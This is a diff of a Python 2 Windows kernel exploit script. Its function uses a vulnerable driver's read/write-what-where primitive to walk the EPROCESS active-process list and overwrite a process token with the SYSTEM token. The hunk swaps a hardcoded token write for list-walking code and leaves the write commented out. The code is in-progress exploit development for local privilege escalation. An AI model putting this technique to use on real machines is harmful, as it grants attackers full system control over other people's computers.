@@ -309,22 +309,29 @@ def executeOverwrite():
         print "Finding link from system offset: "
         ptr_firstEPROCESS = readValueatAddress(driver, system_EPROCESS_struct_ptr+0x2e8, USER_ADDR_OFFSET)
         deref_ptr_firstEPROCESS = readValueatAddress(driver, ptr_firstEPROCESS, USER_ADDR_OFFSET)
-        backEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
-        print "Very first backEPROCESS is: " + hex(backEPROCESS)
-
-
-
+        ptr_backEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+        
         while True:
-            where=0xffff9885390217c0+0x358
-            writeWhatWhere(driver, system_token_value, where)
+            flink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+            flinkEPROCESS = flink - ACTIVE_PROC_LINK_OFFSET
+
+            print "Current active link is: " + hex(flink)
+            nextEPROCESSflink = flinkEPROCESS + ACTIVE_PROC_LINK_OFFSET
+            deref_ptr_nextEPROCESS = readValueatAddress(driver, nextEPROCESSflink, USER_ADDR_OFFSET)
+            nextflink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+
+            print "Next active link is: " + hex(nextflink)
+            #where = flinkEPROCESS+TOKEN_OFFSET
+            #writeWhatWhere(driver, system_token_value, where)
+
+            flink = nextflink
+
+
             total_writes = total_writes + 1
 
-            #backEPROCESS = forwardEPROCESS
-            
-
-            if total_writes > 0:
+            if total_writes > 15:
                 break
-            
+        
 
 ############################################ RUN ################################################
 
